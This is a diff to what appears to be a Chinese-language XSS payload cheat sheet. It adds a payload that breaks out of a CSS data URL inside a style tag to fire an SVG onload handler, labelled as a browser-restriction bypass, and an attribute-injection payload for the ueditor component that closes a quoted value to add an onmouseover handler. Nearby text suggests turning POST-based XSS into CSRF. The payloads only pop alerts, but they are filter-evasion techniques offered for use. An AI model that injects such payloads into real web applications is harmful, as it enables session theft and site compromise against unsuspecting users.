@@ -17,6 +17,32 @@ btoa('<script>alert("xss")</script>1')
 "PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4x"
 ```
 
+**style-XSS(bypass浏览器限制)**
+
+```
+<html>
+<head>
+<style>
+div{
+    background-image: url("data:image/jpg;base64,</style><svg/onload=alert(2)>");
+    background-color: #cccccc;
+}
+</style>
+</head>
+<body>
+
+<div>lol</div>
+
+</body>
+</html>
+```
+
+**bypass部分site-XSS过滤了双引号**
+
+
+**ueidit-xss**
+`cc\" onmouseover=alert(1)%09`
+
 **0x2:基于POST的XSS**
 如果遇到无法将基于POST的XSS转换为GET请求的情况(可能目标服务器上禁用了GET请求)，试试CSRF。
 
